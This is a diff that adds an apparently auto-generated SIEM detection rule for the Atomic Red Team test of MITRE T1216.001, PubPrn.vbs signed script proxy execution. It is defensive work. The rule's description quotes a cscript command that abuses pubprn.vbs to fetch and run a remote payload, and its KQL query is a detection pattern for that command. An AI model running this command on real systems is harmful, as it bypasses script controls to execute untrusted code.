@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'PubPrn.vbs Signed Script Bypass' (GUID: 9dd29a1f-1e16-4862-be83-913b10a88f6c) of technique T1216.001 (Signed Script Proxy Execution: Pubprn). Test Description: Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.. Command/Steps: cscript.exe /b C:\\\\Windows\\\\System32\\\\Printing_Admin_Scripts\\\\en-US\\\\pubprn.vbs localhost \\\"script:#{remote_payload}\\\"\n"
+from = "now-9m"
+rule_id = "a1be0e3c-081a-44f2-a218-5f717f903dea"
+language = "kql"
+name = "Atomic Test: T1216.001 - PubPrn.vbs Signed Script Bypass"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1216.001/T1216.001.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1216.001", "9dd29a1f-1e16-4862-be83-913b10a88f6c", "windows",]
+type = "query"
+query = "(process.name : (\\\"cmd.exe\\\", \\\"cmmon32.exe\\\") OR process.parent.name : (\\\"cmd.exe\\\", \\\"cmmon32.exe\\\")) AND process.command_line : \\\"*cscript.exe*\\\" AND process.command_line : \\\"*C:\\\\Windows\\\\System32\\\\Printing_Admin_Scripts\\\\en-US\\\\pubprn.vbs*\\\" AND process.command_line : \\\"*localhost*\\\""
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1216.001"
+name = "PubPrn.vbs Signed Script Bypass"
+reference = "https://attack.mitre.org/techniques/T1216/001"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1216/001"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1216/001"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1216/001"
+
+
